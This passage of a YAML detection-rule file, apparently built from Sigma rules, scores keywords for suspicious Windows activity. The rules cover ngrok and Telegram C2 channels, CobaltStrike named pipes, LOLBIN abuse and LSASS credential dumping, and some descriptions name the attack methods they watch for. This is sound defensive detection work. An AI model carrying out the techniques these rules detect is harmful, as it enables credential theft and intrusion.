    Attackers were seen using this "ngrok" in order to store their second stage payloads
    and malware.

    While communication with such domains can be legitimate, often times is a sign
    of either data exfiltration by malicious actors or additional download.

    '
  conditions:
    summary:
      regex_any:
      - process
      - initiated
      - network
      - connection
      - ngrok
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1d08ac94_400d_4469_a82f_daee9a908849
  intent: unknown
  tactic: s0508
  description: 'Detects an executable initiating a network connection to "ngrok" tunneling
    domains.

    Attackers were seen using this "ngrok" in order to store their second stage payloads
    and malware.

    While communication with such domains can be legitimate, often times is a sign
    of either data exfiltration by malicious actors or additional download.

    '
  conditions:
    summary:
      regex_any:
      - communication
      - ngrok
      - tunneling
      - service
      - initiated
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_07837ab9_60e1_481f_a74d_c31fb496a94c
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects an executable accessing the portmap.io domain, which could
    be a sign of forbidden C2 traffic or data exfiltration by malicious actors
  conditions:
    summary:
      regex_any:
      - network
      - communication
      - initiated
      - portmap
      - domain
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c3dbbc9f_ef1d_470a_a90a_d343448d5875
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects an a non-browser process interacting with the Telegram API
    which could indicate use of a covert C2
  conditions:
    summary:
      regex_any:
      - suspicious
      - browser
      - network
      - communication
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4b657234_038e_4ad5_997c_4be42340bce4
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects network connections to Visual Studio Code tunnel domains initiated
    by a process on a system. Attackers can abuse that feature to establish a reverse
    shell or persistence on a machine.

    '
  conditions:
    summary:
      regex_any:
      - network
      - connection
      - initiated
      - visual
      - studio
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a66bc059_c370_472c_a0d7_f8fd1bf9d583
  intent: execution
  tactic: execution
  description: Detects network connections from the Equation Editor process "eqnedt32.exe".
  conditions:
    summary:
      regex_any:
      - network
      - connection
      - initiated
      - eqnedt32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8d7e392e_9b28_49e1_831d_5949c6281228
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects a network connection initiated by IMEWDBLD.EXE. This might
    indicate potential abuse of the utility as a LOLBIN in order to download arbitrary
    files or additional payloads.

    '
  conditions:
    summary:
      regex_any:
      - network
      - connection
      - initiated
      - imewdbld
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e81528db_fc02_45e8_8e98_4e84aba1f10b
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects a network connection that is initiated by the "notepad.exe"
    process.

    This might be a sign of process injection from a beacon process or something similar.

    Notepad rarely initiates a network communication except when printing documents
    for example.

    '
  conditions:
    summary:
      regex_any:
      - network
      - connection
      - initiated
      - notepad
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_75e33ce3_ae32_4dcc_9aa8_a2a3029d6f84
  intent: execution
  tactic: execution
  description: 'Detects an office application (Word, Excel, PowerPoint)  that initiate
    a network connection to a non-private IP addresses.

    This rule aims to detect traffic similar to one seen exploited in CVE-2021-42292.

    This rule will require an initial baseline and tuning that is specific to your
    organization.

    '
  conditions:
    summary:
      regex_any:
      - office
      - application
      - initiated
      - network
      - connection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3b5ba899_9842_4bc2_acc2_12308498bf42
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects an office suit application (Word, Excel, PowerPoint, Outlook)
    communicating to target systems over uncommon ports.
  conditions:
    summary:
      regex_any:
      - office
      - application
      - initiated
      - network
      - connection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bef0bc5a_b9ae_425d_85c6_7b2d705980c6
  intent: reconnaissance
  tactic: discovery
  description: Detects a Python process initiating a network connection. While this
    often relates to package installation, it can also indicate a potential malicious
    script communicating with a C&C server.
  conditions:
    summary:
      regex_any:
      - python
      - initiated
      - connection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ed74fe75_7594_4b4b_ae38_e38e3fd2eb23
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects Non-Standard tools initiating a connection over port 3389
    indicating possible lateral movement.

    An initial baseline is required before using this utility to exclude third party
    RDP tooling that you might use.

    '
  conditions:
    summary:
      regex_any:
      - outbound
      - connections
      - over
      - standard
      - tools
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5f699bc5_5446_4a4a_a0b7_5ef2885a3eb4
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects svchost hosting RDP termsvcs communicating with the loopback
    address and on TCP port 3389
  conditions:
    summary:
      regex_any:
      - over
      - reverse
      - tunnel
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b1e5da3b_ca8e_4adf_915c_9921f3d85481
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects svchost hosting RDP termsvcs communicating to target systems
    on TCP port 80 or 443
  conditions:
    summary:
      regex_any:
      - http
      - https
      - target
      - ports
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0531e43a_d77d_47c2_b89f_5fe50321c805
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects "RegAsm.exe" initiating a network connection to public IP adresses
  conditions:
    summary:
      regex_any:
      - regasm
      - initiating
      - network
      - connection
      - public
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c7e91a02_d771_4a6d_a700_42587e0b1095
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a network connection initiated by "Regsvr32.exe"
  conditions:
    summary:
      regex_any:
      - network
      - connection
      - initiated
      - regsvr32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d58ba5c6_0ed7_4b9d_a433_6878379efda9
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects incoming connections to AnyDesk. This could indicate a potential
    remote attacker trying to connect to a listening instance of AnyDesk and use it
    as potential command and control channel.

    '
  conditions:
    summary:
      regex_any:
      - remote
      - access
      - tool
      - anydesk
      - incoming
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cdc8da7d_c303_42f8_b08c_b4ab47230263
  intent: execution
  tactic: execution
  description: Detects a rundll32 that communicates with public IP addresses
  conditions:
    summary:
      regex_any:
      - rundll32
      - internet
      - connection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_50e54b8d_ad73_43f8_96a1_5191685b17a4
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a possible remote connections to Silenttrinity c2
  conditions:
    summary:
      regex_any:
      - silenttrinity
      - stager
      - msbuild
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_20384606_a124_4fec_acbb_8bd373728613
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious network connections made by a well-known Windows
    binary run with no command line parameters
  conditions:
    summary:
      regex_any:
      - suspicious
      - network
      - connection
      - binary
      - commandline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e0f8ab85_0ac9_423b_a73a_81b3c7b1aa97
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects executables located in potentially suspicious directories initiating
    network connections towards file sharing domains.
  conditions:
    summary:
      regex_any:
      - network
      - communication
      - initiated
      - file
      - sharing
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7b434893_c57d_4f41_908d_6a17bf1ae98f
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects a network connection initiated by programs or processes running
    from suspicious or uncommon files system locations.

    '
  conditions:
    summary:
      regex_any:
      - network
      - connection
      - initiated
      - from
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4b89abaa_99fe_4232_afdd_8f9aa4d20382
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects programs that connect to known malware callback ports based
    on statistical analysis from two different sandbox system databases

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - malware
      - callback
      - communication
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6d8c3d20_a5e1_494f_8412_4571d716cf5c
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects programs that connect to uncommon destination ports
  conditions:
    summary:
      regex_any:
      - communication
      - uncommon
      - destination
      - ports
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e54979bd_c5f9_4d6c_967b_a04b19ac4c74
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects uncommon outbound network activity via Kerberos default port
    indicating possible lateral movement or first stage PrivEsc via delegation.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - outbound
      - kerberos
      - connection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9f2cc74d_78af_4eb2_bb64_9cd1d292b87b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious connections from Microsoft Sync Center to non-private
    IPs.
  conditions:
    summary:
      regex_any:
      - microsoft
      - sync
      - center
      - suspicious
      - network
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9976fa64_2804_423c_8a5b_646ade840773
  intent: data_exfiltration
  tactic: exfiltration
  description: 'Adversaries may steal data by exfiltrating it over an un-encrypted
    network protocol other than that of the existing command and control channel.

    The data may also be sent to an alternate network location from the main command
    and control server.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - outbound
      - smtp
      - connections
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c539afac_c12a_46ed_b1bd_5a5567c9f045
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects a process that initiated a network connection over ports 5985
    or 5986 from a non-network service account.

    This could potentially indicates a remote PowerShell connection.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - remote
      - powershell
      - session
      - initiated
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7610a4ea_c06d_495f_a2ac_0a696abcfd3b
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a "winlogon.exe" process that initiate network communications
    with public IP addresses
  conditions:
    summary:
      regex_any:
      - outbound
      - network
      - connection
      - public
      - winlogon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_786cdae8_fefb_4eb2_9227_04e34060db01
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects a network connection initiated by "wordpad.exe" over uncommon
    destination ports.

    This might indicate potential process injection activity from a beacon or similar
    mechanisms.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - wordpad
      - outbound
      - connections
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_08249dc0_a28d_4555_8ba5_9255a198e08c
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects a script interpreter (Wscript/Cscript) initiating a local
    network connection to download or execute a script hosted on a shared folder.

    '
  conditions:
    summary:
      regex_any:
      - local
      - network
      - connection
      - initiated
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_992a6cae_db6a_43c8_9cec_76d7195c96fc
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a script interpreter wscript/cscript opening a network connection
    to a non-local network. Adversaries may use script to download malicious payloads.
  conditions:
    summary:
      regex_any:
      - outbound
      - network
      - connection
      - initiated
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c649a6c7_cd8c_4a78_9c04_000fc76df954
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the use of the Windows Update Client binary (wuauclt.exe)
    to proxy execute code and making network connections.

    One could easily make the DLL spawn a new process and inject to it to proxy the
    network connection and bypass this rule.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - wuauclt
      - network
      - connection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1ea13e8c_03ea_409b_877d_ce5c3d2c1cb3
  intent: data_staging
  tactic: collection
  description: 'Detects suspicious local connections via a named pipe to the AD FS
    configuration database (Windows Internal Database).

    Used to access information such as the AD FS configuration settings which contains
    sensitive information used to sign SAML tokens.

    '
  conditions:
    summary:
      regex_any:
      - adfs
      - database
      - named
      - pipe
      - connection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d5601f8c_b26f_4ab0_9035_69e11a8d4ad2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the creation of a named pipe as used by CobaltStrike
  conditions:
    summary:
      regex_any:
      - cobaltstrike
      - named
      - pipe
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0e7163d4_9e19_4fa7_9be6_000c61aad77a
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the creation of a named pipe matching a pattern used by CobaltStrike
    Malleable C2 profiles
  conditions:
    summary:
      regex_any:
      - cobaltstrike
      - named
      - pipe
      - pattern
      - regex
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_85adeb13_4fc9_4e68_8a4a_c7cb2c336eb7
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the creation of a named pipe with a pattern found in CobaltStrike
    malleable C2 profiles
  conditions:
    summary:
      regex_any:
      - cobaltstrike
      - named
      - pipe
      - patterns
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4d0083b3_580b_40da_9bba_626c19fe4033
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of a pipe name as used by the hack tool CoercedPotato
  conditions:
    summary:
      regex_any:
      - hacktool
      - coercedpotato
      - named
      - pipe
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1f7025a6_e747_4130_aac4_961eb47015f1
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects creation of default named pipe used by the DiagTrackEoP POC,
    a tool that abuses "SeImpersonate" privilege.
  conditions:
    summary:
      regex_any:
      - hacktool
      - diagtrackeop
      - default
      - named
      - pipe
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_637f689e_b4a5_4a86_be0e_0100a0a33ba2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of a pipe name as used by the hack tool EfsPotato
  conditions:
    summary:
      regex_any:
      - hacktool
      - efspotato
      - named
      - pipe
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_961d0ba2_3eea_4303_a930_2cf78bbfcc5e
  intent: credential_harvesting
  tactic: credential_access
  description: Detects well-known credential dumping tools execution via specific
    named pipe creation
  conditions:
    summary:
      regex_any:
      - hacktool
      - credential
      - dumping
      - tools
      - named
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0adc67e0_a68f_4ffd_9c43_28905aad5d6a
  intent: credential_harvesting
  tactic: credential_access
  description: Detects creation of default named pipes used by the Koh tool
  conditions:
    summary:
      regex_any:
      - hacktool
      - default
      - named
      - pipe
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_58cb02d5_78ce_4692_b3e1_dce850aae41a
  intent: execution
  tactic: execution
  description: Detects alternate PowerShell hosts potentially bypassing detections
    looking for powershell.exe
  conditions:
    summary:
      regex_any:
      - alternate
      - powershell
      - hosts
      - pipe
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f318b911_ea88_43f4_9281_0de23ede628e
  intent: execution
  tactic: execution
  description: Detects default CSExec pipe creation
  conditions:
    summary:
      regex_any:
      - csexec
      - default
      - named
      - pipe
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f6451de4_df0a_41fa_8d72_b39f54a08db5
  intent: execution
  tactic: execution
  description: Detects PAExec default named pipe
  conditions:
    summary:
      regex_any:
      - paexec
      - default
      - named
      - pipe
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d36f87ea_c403_44d2_aa79_1a0ac7c24456
  intent: execution
  tactic: execution
  description: Detects default RemCom pipe creation
  conditions:
    summary:
      regex_any:
      - remcom
      - default
      - named
      - pipe
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_493fb4ab_cdcc_4c4f_818c_0e363bd1e4bb
  intent: execution
  tactic: execution
  description: Detects the WMI Event Consumer service scrcons.exe creating a named
    pipe
  conditions:
    summary:
      regex_any:
      - event
      - consumer
      - created
      - named
      - pipe
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fe3ac066_98bb_432a_b1e7_a5229cb39d4a
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the creation of a named pipe seen used by known APTs or malware.
  conditions:
    summary:
      regex_any:
      - malicious
      - named
      - pipe
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_41504465_5e3a_4a5b_a5b4_2a0baadd4463
  intent: unknown
  tactic: s0029
  description: Detects PsExec default pipe creation where the image executed is located
    in a suspicious location. Which could indicate that the tool is being used in
    an attack
  conditions:
    summary:
      regex_any:
      - psexec
      - tool
      - execution
      - from
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3b4b232a_af90_427c_a22f_30b0c0837b95
  intent: unknown
  tactic: g0080
  description: Detects various indicators of Microsoft Connection Manager Profile
    Installer execution
  conditions:
    summary:
      regex_any:
      - cmstp
      - execution
      - process
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_09706624_b7f6_455d_9d02_adee024cee1d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a typical pattern of a CobaltStrike BOF which inject into other
    processes
  conditions:
    summary:
      regex_any:
      - hacktool
      - cobaltstrike
      - injection
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d0d2f720_d14f_448d_8242_51ff396a334e
  intent: unknown
  tactic: s0002
  description: Detects process access requests from hacktool processes based on their
    default image name
  conditions:
    summary:
      regex_any:
      - hacktool
      - generic
      - process
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b1bd3a59_c1fd_4860_9f40_4dd161a7d1f5
  intent: credential_harvesting
  tactic: credential_access
  description: Detects HandleKatz opening LSASS to duplicate its handle to later dump
    the memory without opening any new handles
  conditions:
    summary:
      regex_any:
      - hacktool
      - handlekatz
      - duplicating
      - lsass
      - handle
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7bdde3bf_2a42_4c39_aa31_a92b3e17afac
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the process injection of a LittleCorporal generated Maldoc.
  conditions:
    summary:
      regex_any:
      - hacktool
      - littlecorporal
      - generated
      - maldoc
      - injection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d29ada0f_af45_4f27_8f32_f7b77c3dbc4e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of SysmonEnte, a tool to attack the integrity of Sysmon
  conditions:
    summary:
      regex_any:
      - hacktool
      - sysmonente
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a49fa4d5_11db_418c_8473_1e014a8dd462
  intent: credential_harvesting
  tactic: credential_access
  description: Detects adversaries leveraging the MiniDump export function from comsvcs.dll
    via rundll32 to perform a memory dump from lsass.
  conditions:
    summary:
      regex_any:
      - lsass
      - memory
      - dump
      - comsvcs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9bd012ee_0dff_44d7_84a0_aa698cfd87a3
  intent: unknown
  tactic: s0002
  description: Detects LSASS process access requests from a source process with the
    "dump" keyword in its image name.
  conditions:
    summary:
      regex_any:
      - lsass
      - memory
      - access
      - tool
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5ef9853e_4d0e_4a70_846f_a9ca37d876da
  intent: unknown
  tactic: s0002
  description: 'Detects process access requests to the LSASS process with specific
    call trace calls and access masks.

    This behaviour is expressed by many credential dumping tools such as Mimikatz,
    NanoDump, Invoke-Mimikatz, Procdump and even the Taskmgr dumping feature.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - credential
      - dumping
      - activity
      - lsass
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f8be3e82_46a3_4e4e_ada5_8e538ae8b9c9
  intent: unknown
  tactic: s0349
  description: Detects LSASS process access for potential credential dumping by a
    Python-like tool such as LaZagne or Pypykatz.
  conditions:
    summary:
      regex_any:
      - credential
      - dumping
      - activity
      - python
      - based
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aa35a627_33fb_4d04_a165_d33b4afca3e8
  intent: unknown
  tactic: s0002
  description: Detects remote access to the LSASS process via WinRM. This could be
    a sign of credential dumping from tools like mimikatz.
  conditions:
    summary:
      regex_any:
      - remote
      - lsass
      - process
      - access
      - through
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_472159c5_31b9_4f56_b794_b766faa8b0a7
  intent: credential_harvesting
  tactic: credential_access
  description: Detects suspicious access to LSASS handle via a call trace to "seclogon.dll"
    with a suspicious access right.
  conditions:
    summary:
      regex_any:
      - suspicious
      - lsass
      - access
      - malseclogon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a18dd26b_6450_46de_8c91_9659150cf088
  intent: unknown
  tactic: s0002
  description: Detects process access requests to LSASS process with potentially suspicious
    access flags
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - grantedaccess
      - flags
      - lsass
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e5b33f7d_eb93_48b6_9851_09e1e610b6d7
  intent: unknown
  tactic: s0002
  description: Detects process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz,
    Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll
    or dbgcore.dll for win10, server2016 and up.
  conditions:
    summary:
      regex_any:
      - credential
      - dumping
      - attempt
      - werfault
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4be8b654_0c01_4c9d_a10c_6b28467fc651
  intent: unknown
  tactic: s0002
  description: 'Detects a possible process memory dump that uses a white-listed filename
    like TrolleyExpress.exe as a way to dump the LSASS process memory without Microsoft
    Defender interference

    '
  conditions:
    summary:
      regex_any:
      - lsass
      - access
      - from
      - potentially
      - white
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3f3f3506_1895_401b_9cc3_e86b16e630d0
  intent: execution
  tactic: execution
  description: Detects potential calls to NtOpenProcess directly from NTDLL.
  conditions:
    summary:
      regex_any:
      - potential
      - direct
      - syscall
      - ntopenprocess
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_174afcfa_6e40_4ae9_af64_496546389294
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects when a process tries to access the memory of svchost to potentially
    dump credentials.
  conditions:
    summary:
      regex_any:
      - credential
      - dumping
      - attempt
      - svchost
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_166e9c50_8cd9_44af_815d_d1f0c0e90dde
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious access to the "svchost" process such as that used
    by Invoke-Phantom to kill the thread of the Windows event logging service.
  conditions:
    summary:
      regex_any:
      - suspicious
      - svchost
      - process
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fb3722e4_1a06_46b6_b772_253e2e7db933
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects function calls from the EditionUpgradeManager COM interface.
    Which is an interface that is not used by standard executables.
  conditions:
    summary:
      regex_any:
      - function
      - call
      - from
      - undocumented
      - interface
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4f6c43e2_f989_4ea5_bcd8_843b49a0317c
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using a WoW64 logger DLL hijack (UACMe
    30)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - wow64
      - logger
      - hijack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ec570e53_4c76_45a9_804d_dc3f355ff7a7
  intent: data_staging
  tactic: collection
  description: Detects execution of 7z in order to compress a file with a ".dmp"/".dump"
    extension, which could be a step in a process of dump file exfiltration.
  conditions:
    summary:
      regex_any:
      - 7zip
      - compressing
      - dump
      - files
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9fbf5927_5261_4284_a71d_f681029ea574
  intent: data_staging
  tactic: collection
  description: An adversary may compress or encrypt data that is collected prior to
    exfiltration using 3rd party utilities
  conditions:
    summary:
      regex_any:
      - compress
      - data
      - lock
      - with
      - password
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0f6da907_5854_4be6_859a_e9958747b0aa
  intent: execution
  tactic: execution
  description: 'Detects the execution "AccCheckConsole" a command-line tool for verifying
    the accessibility implementation of an application''s UI.

    One of the tests that this checker can run are called "verification routine",
    which tests for things like Consistency, Navigation, etc.

    The tool allows a user to provide a DLL that can contain a custom "verification
    routine". An attacker can build such DLLs and pass it via the CLI, which would
    then be loaded in the context of the "AccCheckConsole" utility.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - injection
      - acccheckconsole
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_631b22a4_70f4_4e2f_9ea8_42f84d9df6d8
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of the Add-In deployment cache updating utility
    (AddInutil.exe) with suspicious Addinroot or Pipelineroot paths. An adversary
    may execute AddinUtil.exe with uncommon Addinroot/Pipelineroot paths that point
    to the adversaries Addins.Store payload.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - addinutil
      - commandline
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b5746143_59d6_4603_8d06_acbd60e166ee
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects uncommon child processes of the Add-In deployment cache updating
    utility (AddInutil.exe) which could be a sign of potential abuse of the binary
    to proxy execution via a custom Addins.Store payload.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - child
      - process
      - addinutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4f2cd9b6_4a17_440f_bb2a_687abb65993a
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of the Add-In deployment cache updating utility
    (AddInutil.exe) with uncommon Addinroot or Pipelineroot paths. An adversary may
    execute AddinUtil.exe with uncommon Addinroot/Pipelineroot paths that point to
    the adversaries Addins.Store payload.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - addinutil
      - commandline
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6120ac2a_a34b_42c0_a9bd_1fb9f459f348
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of the Add-In deployment cache updating utility (AddInutil.exe)
    from a non-standard directory.
  conditions:
    summary:
      regex_any:
      - addinutil
      - execution
      - from
      - uncommon
      - directory
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2f869d59_7f6a_4931_992c_cce556ff2d53
  intent: credential_harvesting
  tactic: credential_access
  description: Detects execution of "AdPlus.exe", a binary that is part of the Windows
    SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary
    commands.
  conditions:
    summary:
      regex_any:
      - potential
      - adplus
      - abuse
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7efd2c8d_8b18_45b7_947d_adfe9ed04f61
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of the AgentExecutor.exe binary. Which can be abused
    as a LOLBIN to execute powershell scripts with the ExecutionPolicy "Bypass" or
    any binary named "powershell.exe" located in the path provided by 6th positional
    argument
  conditions:
    summary:
      regex_any:
      - agentexecutor
      - powershell
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c0b40568_b1e9_4b03_8d6c_b096da6da9ab
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of the AgentExecutor.exe binary. Which can be abused
    as a LOLBIN to execute powershell scripts with the ExecutionPolicy "Bypass" or
